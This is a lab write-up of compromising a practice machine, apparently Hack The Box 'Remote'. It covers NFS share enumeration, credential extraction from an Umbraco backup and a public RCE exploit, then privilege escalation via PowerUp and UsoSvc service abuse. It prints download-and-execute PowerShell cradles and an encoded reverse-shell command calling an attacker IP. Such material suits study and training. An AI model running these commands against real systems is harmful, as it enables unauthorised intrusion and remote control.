starting with nmap 
`sudo nmap -sC -sV -p- -T4 -oN Remote 10.10.10.180
`
![[Pasted image 20240525200452.png]]


we got nfs,ftp,web , smb and some rpcs protocols 

after taking a look on the smb and ftp , didn't  find something interesting .

left web and nfs 

starting with nfs 
`showmount -e 10.10.10.180`
![[Pasted image 20240525200833.png]]

anyone can mount ==/site_backups== (everyone )

site_backups is a juicy  name 

`sudo mount -t nfs 10.10.10.180:/site_backups mnt
`
![[Pasted image 20240525201259.png]]

what's ==umbraco== ?
quick google search tell us that this a cms written for C# 

so this is the backup of the website , it may contains juicy infos .
 ![[Pasted image 20240525201615.png]]

I was wondering , where does this cms store the credential of the users , so I google it 

easy rights ?
![[Pasted image 20240525201716.png]]
![[Pasted image 20240525201843.png]]


`strings UmbracoDev.sdf | less`
![[Pasted image 20240525201935.png]]

here we go 
![[Pasted image 20240525202011.png]]

![[Pasted image 20240525202059.png]]

goolging this version 

![[Pasted image 20240525202131.png]]

eeeem . let's clone it and run the exploit 
https://github.com/Jonoans/Umbraco-RCE
`python3 exploit.py -u admin@htb.local -p baconandcheese -w 'http://10.10.10.180/' -i 10.10.14.15 `

![[Pasted image 20240525202307.png]]


we got access using web , some we will have the ==SetImpersonatePrvilege== so we can use Potatos exploit to get administrator 

since this is a windows server 2019 , juicypotato will not work , however we could use   
[[https://github.com/itm4n/PrintSpoofer]] and https://github.com/antonioCoco/RoguePotato 

let's confirm this 
![[Pasted image 20240525202722.png]]

the shell we got from the script is unstable so I use metasploit tricks (you know how to do that )

![[Pasted image 20240525202935.png]]


![[Pasted image 20240525202944.png]]


another way to get system on the box , is by using tools like PowerUP.ps1 and Winpeas.ps1 

first let's host POwerUP.ps1
`IEX (New-Object Net.Webclient).downloadstring("http://10.10.14.15/PowerUp.ps1") ; Invoke-AllCheck`
![[Pasted image 20240525203857.png]]

`IEX (New-Object Net.Webclient).downloadstring("http://10.10.14.15/PowerUp.ps1") ; Invoke-ServiceAbuse -Name 'UsoSvc'
`
![[Pasted image 20240525204052.png]]

we create a new user with admin privilege , we could abuse the service to get reverse shell directly

by using this 
`sc.exe config UsoSvc binpath= "cmd.exe /c powershell.exe -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA1ACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="`

`sc.exe start UsoSvc `

![[Pasted image 20240525211759.png]]

